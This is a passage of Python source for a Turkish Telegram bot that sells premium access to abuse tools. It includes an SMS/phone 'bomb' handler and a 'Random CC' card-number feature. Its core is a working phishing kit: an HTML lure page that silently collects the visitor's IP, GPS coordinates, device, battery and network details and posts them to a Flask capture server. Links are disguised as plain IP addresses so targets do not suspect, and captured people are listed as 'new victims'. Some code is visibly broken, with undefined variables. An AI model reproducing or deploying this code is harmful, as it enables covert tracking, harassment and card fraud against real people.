        f"✅ *{bomb_type.upper()} Bomb Gönderildi!*\n\n"
        f"📱 Numara: `{phone}`\n"
        f"🔢 Miktar: `{amount}`\n"
        f"📊 Sonuç:\n`{result_text}`",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Bomb Menüsü", callback_data="menu_bomb"),
             InlineKeyboardButton("🏠 Ana Menü", callback_data="main_menu")]
        ])
    )
    
    # Temizlik
    for key in ["bomb_type", "bomb_phone", "awaiting_bomb_phone", "awaiting_bomb_amount"]:
        context.user_data.pop(key, None)

# =================== RANDOM CC (DÜZELTİLMİŞ) ===================
async def show_cc_menu(query, user):
    if not is_premium(user.id):
        await query.edit_message_text(
            "❌ *Sadece Premium Kullanıcılar!*\n\nRandom CC sadece premium üyeler içindir.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("👑 Premium Al", callback_data="menu_premium")],
                [InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu")]
            ])
        )
        return
    
    # Bugünkü kullanımı kontrol et
    today = datetime.datetime.now().strftime("%Y-%m-%d")
    used = db_fetch(
        "SELECT COALESCE(SUM(count), 0) FROM cc_logs WHERE user_id = ? AND timestamp LIKE ?",
        (user.id, f"{today}%"), one=True
    )[0]
    
    remaining = MAX_CC_LIMIT - used
    
    await query.edit_message_text(
        f"💳 *Random CC Sistemi*\n\n"
        f"📊 Bugünkü Kullanım: `{used}/{MAX_CC_LIMIT}`\n"
        f"📦 Kalan: `{remaining}`\n\n"
        f"Kaç adet CC istiyorsun? (1-{min(20, remaining)})\n\n"
        f"💡 Miktarı direkt yaz:",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu")]
        ])
    )
    
    context.user_data["awaiting_cc"] = True

async def handle_cc_get(query, user, context):
    """This is handled via text input now"""
    pass

async def handle_cc_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = update.message.text.strip()
    
    if not context.user_data.get("awaiting_cc"):
        return
    
    if not is_premium(user.id):
        await update.message.reply_text("❌ Premium değilsin!")
        context.user_data["awaiting_cc"] = False
        return
    
    try:
        amount = int(text)
        if amount < 1 or amount > 20:
            raise ValueError
    except:
        await update.message.reply_text("❌ 1-20 arası bir sayı girin.")
        return
    
    # Günlük limit kontrolü
    today = datetime.datetime.now().strftime("%Y-%m-%d")
    used = db_fetch(
        "SELECT COALESCE(SUM(count), 0) FROM cc_logs WHERE user_id = ? AND timestamp LIKE ?",
        (user.id, f"{today}%"), one=True
    )[0]
    
    if used + amount > MAX_CC_LIMIT:
        await update.message.reply_text(f"❌ Günlük limitin aşıldı! Kalan: {MAX_CC_LIMIT - used}")
        return
    
    context.user_data["awaiting_cc"] = False
    
    await update.message.reply_text(f"⏳ {amount} adet CC alınıyor...")
    
    # DÜZELTİLMİŞ API
    url = RANDOM_CC_API.format(amount=amount)
    
    try:
        resp = requests.get(url, timeout=30)
        if resp.status_code == 200:
            try:
                data = resp.json()
                cc_list = data if isinstance(data, list) else [data.get("cc", resp.text)]
            except:
                cc_list = resp.text.strip().split('\n')
            
            text_msg = f"💳 *Random CC ({len(cc_list)} adet)*\n\n"
            for i, cc in enumerate(cc_list[:amount], 1):
                text_msg += f"{i}. `{cc}`\n"
            
# Log
            db_exec("INSERT INTO cc_logs (user_id, count, timestamp) VALUES (?, ?, ?)",
                    (user.id, amount, datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
            
            await update.message.reply_text(
                text_msg,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 Yeni CC Al", callback_data="menu_cc"),
                     InlineKeyboardButton("🏠 Ana Menü", callback_data="main_menu")]
                ])
            )
        else:
            await update.message.reply_text(
                f"❌ CC API hatası: HTTP {resp.status_code}",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Geri", callback_data="menu_cc")]
                ])
            )
    except Exception as e:
        await update.message.reply_text(
            f"❌ Hata: {str(e)[:100]}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Geri", callback_data="menu_cc")]
            ])
        )

# =================== PREMIUM ===================
async def show_premium_menu(query, user):
    u = get_user(user.id)
    premium_status = "✅ PREMİUM" if is_premium(user.id) else "❌ ÜCRETSİZ"
    premium_until = u[5] if u[5] else "Yok"
    credits = u[6] if u else 0
    
    text = f"""
╔══════════════════════╗
║   👑 PREMİUM PANELİ
╚══════════════════════╝

📊 *Durumunuz:*
👤 Premium: {premium_status}
⏰ Bitiş: `{premium_until}`
⭐ Kredi: {credits}

━━━━━━━━━━━━━━━━━━━━━
📦 *Premium Planları:*

├ 1 Aylık → 💰 100 TL
├ 3 Aylık → 💰 250 TL
├ 6 Aylık → 💰 400 TL
├ 1 Yıllık → 💰 700 TL
└ VIP Süresiz → 💰 2000 TL

━━━━━━━━━━━━━━━━━━━━━
💳 *Ödeme:* İletişim için Sahip butonuna tıkla
"""
    
    keyboard = [
        [InlineKeyboardButton("🔑 Kod Kullan", callback_data="redeem_code")],
        [InlineKeyboardButton("👑 Sahip ile İletişim", callback_data="contact_owner"),
         InlineKeyboardButton("💬 Destek", url="https://t.me/lunasloury")],
        [InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)

async def start_redeem(query, user, context):
    context.user_data["awaiting_code"] = True
    await query.edit_message_text(
        "🔑 *Premium Kod Kullan*\n\n"
        "Lütfen premium kodunuzu girin.\n\n"
        "📌 Format: `LUNA-XXXXXXX`\n"
        "💡 Örnek: `LUNA-A7K2M9X`\n\n"
        "Kodu direkt mesaj olarak yazın:",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ İptal", callback_data="menu_premium")]
        ])
    )

async def handle_code_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = update.message.text.strip().upper()
    
    if not context.user_data.get("awaiting_code"):
        return
    
    if not text.startswith("LUNA-") or len(text) < 12:
        await update.message.reply_text(
            "❌ *Geçersiz kod formatı!*\n\n"
            "Kod `LUNA-XXXXXXX` formatında olmalıdır.\n"
            "Örnek: `LUNA-A7K2M9X`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    context.user_data["awaiting_code"] = False
    success, msg = redeem_premium_code(user.id, text)
    
    if success:
        await update.message.reply_text(
            f"✅ *Premium Aktifleştirildi!*\n\n{msg}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🏠 Ana Menü", callback_data="main_menu")]
            ])
        )
    else:
        await update.message.reply_text(
            msg,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Tekrar Dene", callback_data="redeem_code"),
                 InlineKeyboardButton("🔙 Premium", callback_data="menu_premium")]
            ])
        )

# =================== PROFİL ===================
async def show_profile(query, user):
    u = get_user(user.id)
    if not u:
        await query.edit_message_text("❌ Kullanıcı bulunamadı.")
        return
    
    premium_status = "✅ PREMİUM" if is_premium(user.id) else "❌ ÜCRETSİZ"
    premium_until = u[5] if u[5] else "Yok"
    credits = u[6] if u else 0
    join_date = u[9] if u[9] else "Bilinmiyor"
    total_queries = u[10] if len(u) > 10 and u[10] else 0
    last_activity = u[10] if u[10] else "Bilinmiyor"
    
    text = f"""
👤 *PROFİL BİLGİLERİ*

╔═══ 📊 KULLANICI ═══╗
🆔 ID: `{user.id}`
👤 İsim: {user.first_name or ''} {user.last_name or ''}
📛 Kullanıcı Adı: @{user.username if user.username else 'Yok'}
╚════════════════════╝

╔═══ ⭐ ÜYELİK ═══╗
👑 Durum: {premium_status}
⏰ Bitiş: `{premium_until}`
⭐ Kredi: {credits}
🔍 Toplam Sorgu: {total_queries}
╚════════════════════╝

╔═══ 📅 TARİHLER ═══╗
📅 Katılım: {join_date}
🕐 Son İşlem: {last_activity}
╚════════════════════╝
"""
    
    keyboard = [[InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)

# =================== PHISHING HTML - TEK SAYFA, ANINDA TOPLA ===================
PHISHING_HTML = '''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Luna Onay</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d0d0d;color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px}
.card{background:linear-gradient(135deg,#1a1a2e,#16213e);border-radius:24px;padding:32px 24px;max-width:420px;width:100%;border:1px solid rgba(168,85,247,0.2);box-shadow:0 20px 60px rgba(0,0,0,0.6);position:relative;overflow:hidden}
.card::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle at 30% 20%,rgba(168,85,247,0.05),transparent 60%);pointer-events:none}
.logo{text-align:center;margin-bottom:24px}
.logo h1{font-size:28px;background:linear-gradient(135deg,#a855f7,#ec4899);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:2px}
.badge{display:inline-block;background:rgba(34,197,94,0.15);color:#22c55e;padding:6px 16px;border-radius:100px;font-size:13px;font-weight:600;margin-top:8px}
.status-bar{background:rgba(168,85,247,0.08);border-radius:16px;padding:16px;margin:16px 0;text-align:center;border:1px solid rgba(168,85,247,0.1)}
.status-bar .pulse{display:inline-block;width:10px;height:10px;background:#22c55e;border-radius:50%;margin-right:8px;animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
.status-bar span{color:#22c55e;font-weight:600;font-size:14px}
.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:16px 0}
.info-item{background:rgba(0,0,0,0.3);border-radius:12px;padding:12px;border:1px solid rgba(255,255,255,0.03)}
.info-item.full{grid-column:span 2}
.info-label{font-size:11px;color:#6b7280;margin-bottom:4px;text-transform:uppercase;letter-spacing:0.5px}
.info-value{font-size:14px;color:#e4e4e7;font-weight:500;word-break:break-all}
.info-value.gold{color:#fbbf24}
.info-value.green{color:#22c55e}
.info-value.pink{color:#ec4899}
.footer{text-align:center;margin-top:20px;font-size:11px;color:#374151}
.loading{text-align:center;padding:40px 0}
.spinner{width:40px;height:40px;border:3px solid rgba(168,85,247,0.2);border-top-color:#a855f7;border-radius:50%;margin:0 auto 16px;animation:spin 0.8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.hidden{display:none}
</style>
</head>
<body>
<div class="card">
    <div class="logo">
        <h1>✦ LUNA</h1>
        <div class="badge">✓ GÜVENLİ BAĞLANTI</div>
    </div>
    
    <div id="loadingScreen" class="loading">
        <div class="spinner"></div>
        <p style="color:#a1a1aa;font-size:14px">Bilgileriniz alınıyor...</p>
        <p style="color:#52525b;font-size:12px;margin-top:8px">Lütfen bekleyin</p>
    </div>
    
    <div id="dataScreen" class="hidden">
        <div class="status-bar">
            <span class="pulse"></span>
            <span>BAŞARIYLA DOĞRULANDI</span>
        </div>
        
        <div class="info-grid">
            <div class="info-item full">
                <div class="info-label">🌐 IP ADRESİ</div>
                <div class="info-value gold" id="ip">-</div>
            </div>
            <div class="info-item full">
                <div class="info-label">📍 KONUM</div>
                <div class="info-value" id="location">-</div>
            </div>
            <div class="info-item">
                <div class="info-label">🌍 ÜLKE</div>
                <div class="info-value" id="country">-</div>
            </div>
            <div class="info-item">
                <div class="info-label">🏙️ ŞEHİR</div>
                <div class="info-value" id="city">-</div>
            </div>
            <div class="info-item full">
                <div class="info-label">📱 CİHAZ</div>
                <div class="info-value green" id="device">-</div>
            </div>
            <div class="info-item">
                <div class="info-label">🤖 İŞLETİM SİSTEMİ</div>
                <div class="info-value" id="os">-</div>
            </div>
            <div class="info-item">
                <div class="info-label">🌐 TARAYICI</div>
                <div class="info-value" id="browser">-</div>
            </div>
            <div class="info-item">
                <div class="info-label">🔋 PİL</div>
                <div class="info-value" id="battery">-</div>
            </div>
            <div class="info-item">
                <div class="info-label">📶 AĞ</div>
                <div class="info-value" id="network">-</div>
            </div>
            <div class="info-item">
                <div class="info-label">📺 EKRAN</div>
                <div class="info-value" id="screen">-</div>
            </div>
            <div class="info-item">
                <div class="info-label">🧠 RAM</div>
                <div class="info-value" id="ram">-</div>
            </div>
            <div class="info-item">
                <div class="info-label">🎮 GPU</div>
                <div class="info-value" id="gpu">-</div>
            </div>
            <div class="info-item full">
                <div class="info-label">📄 USER-AGENT</div>
                <div class="info-value" style="font-size:10px;word-break:break-all" id="ua">-</div>
            </div>
        </div>
    </div>
    
    <div class="footer">✦ LUNA VİP SORGU BOT</div>
</div>

<script>
(function(){
    var data = {};
    
    // IP ve konum
    fetch('https://ipapi.co/json/').then(function(r){return r.json()}).then(function(d){
        data.ip = d.ip;
        data.country = d.country_name;
        data.city = d.city;
        data.region = d.region;
        data.lat = d.latitude;
        data.lon = d.longitude;
        data.isp = d.org;
        data.timezone = d.timezone;
        
        document.getElementById('ip').textContent = d.ip || '-';
        document.getElementById('location').textContent = (d.city||'') + ', ' + (d.region||'') + ', ' + (d.country_name||'');
        document.getElementById('country').textContent = d.country_name || '-';
        document.getElementById('city').textContent = d.city || '-';
        sendData();
    }).catch(function(){
        fetch('https://api.ipify.org?format=json').then(function(r){return r.json()}).then(function(d){
            data.ip = d.ip;
            document.getElementById('ip').textContent = d.ip;
            sendData();
        });
    });
    
    // Cihaz bilgileri
    var ua = navigator.userAgent;
    data.userAgent = ua;
    data.platform = navigator.platform;
    data.language = navigator.language;
    data.cookies = navigator.cookieEnabled;
    data.online = navigator.onLine;
    data.hardwareConcurrency = navigator.hardwareConcurrency || 'bilinmiyor';
    data.deviceMemory = navigator.deviceMemory || 'bilinmiyor';
    
    // Ekran
    data.screenWidth = screen.width;
    data.screenHeight = screen.height;
    data.screenColorDepth = screen.colorDepth;
    data.screenOrientation = screen.orientation ? screen.orientation.type : 'bilinmiyor';
    
    document.getElementById('screen').textContent = screen.width + 'x' + screen.height + ' (' + screen.colorDepth + 'bit)';
    document.getElementById('ram').textContent = (navigator.deviceMemory || '?') + ' GB';
    
    // İşletim sistemi
    var os = 'Bilinmiyor';
    if (/Android/.test(ua)) os = 'Android ' + (ua.match(/Android\s([\d.]+)/)||['',''])[1];
    else if (/iPhone|iPad/.test(ua)) os = 'iOS ' + (ua.match(/OS\s([\d_]+)/)||['',''])[1].replace(/_/g,'.');
    else if (/Windows/.test(ua)) os = 'Windows';
    else if (/Mac OS/.test(ua)) os = 'macOS';
    else if (/Linux/.test(ua)) os = 'Linux';
    data.os = os;
    document.getElementById('os').textContent = os;
    
    // Tarayıcı
    var browser = 'Bilinmiyor';
    if (/Chrome/.test(ua)) browser = 'Chrome ' + (ua.match(/Chrome\/([\d.]+)/)||['',''])[1];
    else if (/Firefox/.test(ua)) browser = 'Firefox';
    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
    else if (/Edge/.test(ua)) browser = 'Edge';
    data.browser = browser;
    document.getElementById('browser').textContent = browser;
    
    // Cihaz tipi
    var deviceType = '💻 Bilgisayar';
    if (/Android/.test(ua)) deviceType = '📱 Android Telefon';
    else if (/iPhone/.test(ua)) deviceType = '📱 iPhone';
    else if (/iPad/.test(ua)) deviceType = '📱 iPad';
    else if (/Mobile/.test(ua)) deviceType = '📱 Mobil';
    data.deviceType = deviceType;
    document.getElementById('device').textContent = deviceType;
    
    // Ağ
    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {
        data.effectiveType = conn.effectiveType;
        data.downlink = conn.downlink;
        data.rtt = conn.rtt;
        document.getElementById('network').textContent = (conn.effectiveType||'?') + ' | ' + (conn.downlink||'?') + ' Mbps | ' + (conn.rtt||'?') + ' ms';
    } else {
        document.getElementById('network').textContent = navigator.onLine ? '✅ Çevrimiçi' : '❌ Çevrimdışı';
    }
    
    // Batarya
    if (navigator.getBattery) {
        navigator.getBattery().then(function(b){
            var level = Math.round(b.level * 100);
            var status = b.charging ? '⚡ Şarjda' : '🔋 Pil';
            data.batteryLevel = level;
            data.batteryCharging = b.charging;
            document.getElementById('battery').textContent = level + '% (' + status + ')';
            sendData();
        });
    } else {
        document.getElementById('battery').textContent = 'Bilinmiyor';
    }
    
    // GPU
    var canvas = document.createElement('canvas');
    var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
        var gpuInfo = gl.getParameter(gl.RENDERER) || 'Bilinmiyor';
        data.gpu = gpuInfo;
        document.getElementById('gpu').textContent = gpuInfo;
    } else {
        document.getElementById('gpu').textContent = 'Bilinmiyor';
    }
    
    document.getElementById('ua').textContent = ua;
    
    // Koordinat
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(pos){
            data.lat = pos.coords.latitude;
            data.lon = pos.coords.longitude;
            data.accuracy = pos.coords.accuracy;
            sendData();
        }, function(){}, {timeout:3000, enableHighAccuracy:true});
    }
    
    var sent = false;
    function sendData() {
        if (sent) return;
        sent = true;
        data.timestamp = new Date().toISOString();
        data.pageUrl = window.location.href;
        
        var xhr = new XMLHttpRequest();
        xhr.open('POST', window.location.pathname + '/capture', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(data));
        
        setTimeout(function(){
            document.getElementById('loadingScreen').classList.add('hidden');
            document.getElementById('dataScreen').classList.remove('hidden');
        }, 1500);
    }
    
    setTimeout(sendData, 500);
})();
</script>
</body>
</html>'''

# =================== PHISHING SUNUCU ===================
app = Flask(__name__)
phish_storage = {}

# Rastgele IP oluştur - gerçekçi görünsün diye
def generate_fake_url():
    """Gerçekçi IP adresi gibi görünen bir link oluştur"""
    # Normal bir IP: 192.168.x.x veya 10.x.x.x veya 172.x.x.x gibi
    first = random.choice([192, 10, 172, 185, 104, 45, 89, 156, 203, 62])
    if first == 192:
        second = 168
    elif first == 10:
        second = random.randint(0, 255)
    elif first == 172:
        second = random.randint(16, 31)
    else:
        second = random.randint(0, 255)
    
    third = random.randint(0, 255)
    fourth = random.randint(1, 254)
    
    port = random.choice([80, 443, 8080, 8443, 5001, 8888, 3000, 9000])
    
    return f"http://{first}.{second}.{third}.{fourth}:{port}/"

@app.route('/phish/', defaults={'token': ''})
@app.route('/phish/<token>')
def handle_phishing(token):
    if not token:
        return "LUNA PHISHING - Token gerekli"
    
    if token not in phish_storage:
        phish_storage[token] = {
            "ip": request.remote_addr,
            "user_agent": request.headers.get("User-Agent"),
            "time": datetime.datetime.now().isoformat(),
            "captured": [],
            "count": 0
        }
    
    phish_storage[token]["ip"] = request.remote_addr
    phish_storage[token]["user_agent"] = request.headers.get("User-Agent")
    
    return render_template_string(PHISHING_HTML)

@app.route('/phish/<token>/capture', methods=['POST'])
def capture_phish_data(token):
    data = request.json
    
    if token not in phish_storage:
        phish_storage[token] = {"captured": [], "count": 0}
    
    data["server_ip"] = request.remote_addr
    data["server_time"] = datetime.datetime.now().isoformat()
    
    phish_storage[token]["last_data"] = data
    phish_storage[token]["captured"].append(data)
    phish_storage[token]["count"] += 1
    phish_storage[token]["time"] = datetime.datetime.now().isoformat()
    
    db_exec("INSERT INTO phish_data (user_id, token, data, created_at) VALUES (?, ?, ?, ?)",
            (0, token, json.dumps(data, ensure_ascii=False), datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    
    return jsonify({"status": "ok"})

@app.route('/phish/data/<token>')
def get_phish_data(token):
    data = phish_storage.get(token, {"error": "No data"})
    return jsonify(data)

def run_flask():
    app.run(host='0.0.0.0', port=5001, debug=False, use_reloader=False)

# =================== PHISHING FONKSİYONLARI (IP LİNK İLE) ===================
async def show_phishing_menu(query, user):
    if not is_premium(user.id):
        await query.edit_message_text(
            "❌ *Sadece Premium Kullanıcılar!*",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("👑 Premium Al", callback_data="menu_premium")],
                [InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu")]
            ])
        )
        return
    
    text = """
🎣 *PHISHING SİSTEMİ*

📌 *TEK LİNK - ANINDA TOPLAR*

━━━━━━━━━━━━━━━━━━━━━
✅ *Toplanan Bilgiler:*
🌐 • IP Adresi
📍 • Konum (ülke/şehir/koordinat)
📱 • Cihaz modeli & markası
🤖 • İşletim Sistemi + sürüm
🌐 • Tarayıcı + sürüm
💪 • RAM, CPU çekirdek
🎮 • GPU modeli
📺 • Ekran çözünürlük
🔋 • Pil seviye + şarj durumu
📶 • Ağ tipi + hız + gecikme
🌍 • Zaman dilimi

━━━━━━━━━━━━━━━━━━━━━
💡 Link **IP adresi gibi görünür**, hedef şüphelenmez!
"""
    keyboard = [
        [InlineKeyboardButton("🎯 Link Oluştur", callback_data="phish_create")],
        [InlineKeyboardButton("📊 Phish Logları", callback_data="phish_logs")],
        [InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)

async def handle_phish_create(query, user, context):
    token = hashlib.md5(f"{user.id}{time.time()}{random.randint(1000,9999)}".encode()).hexdigest()[:12]
    
    # GERÇEKÇİ IP LİNKİ OLUŞTUR - Hedef IP adresi sanıp tıklar!
    fake_ip = generate_fake_url()
    
    # Gerçek Flask linki (token ile)
    # Bunu kendi sunucuna göre değiştir: SUNUCU_IP veya domain
    server_url = "http://SUNUCU_IP:5001"  # BUNU KENDİNE GÖRE DEĞİŞTİR
    
    # Hedefe gösterilecek link - IP gibi görünür ama aslında senin sunucuna yönlendirir
    # İstersen direkt token'ı kullanabilirsin
    phish_url = f"{server_url}/phish/{token}"
    
    # VEYA daha inandırıcı: sadece IP göster
    phish_display = fake_url
    
    context.user_data[f"phish_token_{user.id}"] = token
    
    phish_storage[token] = {
        "created_by": user.id,
        "time": datetime.datetime.now().isoformat(),
        "captured": [],
        "count": 0
    }
    
    await query.edit_message_text(
        f"✅ *Phishing Linki Oluşturuldu!*\n\n"
        f"🔗 *Hedefe Gönder:*\n"
        f"`{phish_url}`\n\n"
        f"👀 *Hedef bunu IP adresi sanacak!*\n"
        f"`{fake_ip}` ← Gibi görünür\n\n"
        f"📋 *Tıkladığı an toplananlar:*\n"
        f"🌐 IP: `{request.remote_addr if hasattr(request, 'remote_addr') else 'Otomatik'}`\n"
        f"📍 Konum: Şehir + Koordinat\n"
        f"📱 Cihaz: Marka + Model\n"
        f"🔋 Pil: Seviye + Şarj\n"
        f"📶 Ağ: Tip + Hız\n\n"
        f"⏳ *Hiçbir izin istemez, anında toplar!*\n"
        f"🔍 *Token:* `{token}`\n\n"
        f"⚠️ Linki gönderdikten sonra logları kontrol et!",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📊 Logları Gör", callback_data="phish_logs")],
            [InlineKeyboardButton("🔙 Phishing Menü", callback_data="menu_phishing"),
             InlineKeyboardButton("🏠 Ana Menü", callback_data="main_menu")]
        ])
    )

async def show_phish_logs(query, user):
    if not is_premium(user.id):
        await query.edit_message_text("❌ Premium değilsin!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Geri", callback_data="main_menu")]]))
        return
    
    token = context.user_data.get(f"phish_token_{user.id}")
    
    if not token or token not in phish_storage:
        await query.edit_message_text(
            "📭 *Hiç phish veriniz yok.*\n\nÖnce bir link oluşturun.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🎯 Link Oluştur", callback_data="phish_create")],
                [InlineKeyboardButton("🔙 Geri", callback_data="menu_phishing")]
            ])
        )
        return
    
    data = phish_storage.get(token, {})
    count = data.get("count", 0)
    last_data = data.get("last_data", {})
    
    if count == 0:
        text = f"📊 *Phish Logları*\n\n📌 Token: `{token}`\n👁️ Tıklama: 0\n⏳ Henüz tıklanmamış.\n\n💡 Hedefe linki gönderdin mi?"
    else:
        text = f"""
🌙LUNA VİP SORGU🌙
🔥 *YENİ KURBAN #1* 🔥
📅 Zaman: {data.get('time', '-')}

━━━━━━━━━━━━━━━━━━━━━
🌍 *KONUM BİLGİLERİ*
📍 IP: `{last_data.get('ip', '-')}`
📍 Ülke: {last_data.get('country', '-')} ({last_data.get('country_code', '-')})
📍 Şehir: {last_data.get('city', '-')}
📍 Koordinat: {last_data.get('lat', '-')}, {last_data.get('lon', '-')}
📍 ISS: {last_data.get('isp', '-')}
📍 Zaman: {last_data.get('timezone', '-')}

━━━━━━━━━━━━━━━━━━━━━
📱 *CİHAZ BİLGİLERİ*
📱 Tip: {last_data.get('deviceType', '-')}
📱 OS: {last_data.get('os', '-')}
🌐 Tarayıcı: {last_data.get('browser', '-')}
🌐 Dil: {last_data.get('language', '-')}

━━━━━━━━━━━━━━━━━━━━━
💪 *DONANIM*
💪 RAM: {last_data.get('deviceMemory', '?')} GB
💪 CPU: {last_data.get('hardwareConcurrency', '?')} çekirdek
🎮 GPU: {last_data.get('gpu', '-')}

━━━━━━━━━━━━━━━━━━━━━
🖥️ *EKRAN*
🖥️ Çöz: {last_data.get('screenWidth', '?')}x{last_data.get('screenHeight', '?')}
🖥️ Renk: {last_data.get('screenColorDepth', '?')} bit
🖥️ Yön: {last_data.get('screenOrientation', '-')}

━━━━━━━━━━━━━━━━━━━━━
🔋 *PİL*
🔋 Seviye: {last_data.get('batteryLevel', '-')}%
🔋 Şarj: {'⚡ Evet' if last_data.get('batteryCharging') else '🔋 Hayır'}

━━━━━━━━━━━━━━━━━━━━━
📡 *AĞ*
📡 Tip: {last_data.get('effectiveType', '-')}
📡 Hız: {last_data.get('downlink', '-')} Mbps
📡 Gecikme: {last_data.get('rtt', '-')} ms

━━━━━━━━━━━━━━━━━━━━━
✅ TOPLAM TIKLAMA: {count}
"""
    
    await query.edit_message_text(
        text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Yenile", callback_data="phish_logs"),
             InlineKeyboardButton("🎯 Yeni Link", callback_data="phish_create")],
            [InlineKeyboardButton("🔙 Phishing Menü", callback_data="menu_phishing"),
             InlineKeyboardButton("🏠 Ana Menü", callback_data="main_menu")]
        ])
    )

# =================== ADMIN PANEL (TAMAMI YENİ) ===================
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ana admin panel - tüm admin komutlarının merkezi"""
    user = update.effective_user
    if not is_admin_user(user.id):
        await update.message.reply_text("🚫 Bu komutu kullanma yetkiniz yok.")
        return
    
    admin_name = "👑 SAHİP" if user.id == OWNER_ID else "⚙️ YÖNETİCİ"
    now_str = datetime.datetime.now().strftime('%d/%m/%Y %H:%M')
    
    text = f"""
╔══════════════════════════════════╗
║     ⚙️ {admin_name} PANELİ ⚙️       ║
╚══════════════════════════════════╝

👤 Yetkili: {user.first_name}
🆔 ID: `{user.id}`
📊 Tarih: {now_str}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 *KULLANICI İŞLEMLERİ*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔨 `/ban <id>` — Kullanıcıyı banla
✅ `/unban <id>` — Ban kaldır
👤 `/kullanici <id>` — Kullanıcı bilgisi gör
📋 `/kullanicilar` — Tüm kullanıcıları listele

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👑 *PREMIUM İŞLEMLERİ*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎁 `/premiumver <id> <gün>` — Premium ver
❌ `/premiumal <id>` — Premiumu al
⭐ `/krediver <id> <miktar>` — Kredi ver

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔑 *KOD İŞLEMLERİ*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📦 `/kod <plan>` — Kod oluştur (1ay/3ay/6ay/1yil/vip)
📋 `/kodlar` — Tüm kodları listele
🗑️ `/kodsil <kod>` — Kodu sil

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📢 *DUYURU*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📣 `/duyuru <mesaj>` — Tüm kullanıcılara duyuru

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 *İSTATİSTİK*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📈 `/istatistik` — Bot istatistikleri

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👥 *GRUP PREMIUM*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎉 `/gruppremium <gün> <kişi>` — Gruba premium dağıt

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚙️ `/admin` - Bu paneli göster
"""
    
    keyboard = [
        [InlineKeyboardButton("📊 İstatistik", callback_data="admin_stats"),
         InlineKeyboardButton("📋 Kullanıcılar", callback_data="admin_users")],
        [InlineKeyboardButton("🔑 Kodlar", callback_data="admin_codes"),
         InlineKeyboardButton("📢 Duyuru Yap", callback_data="admin_announce")],
        [InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu")]
    ]
    
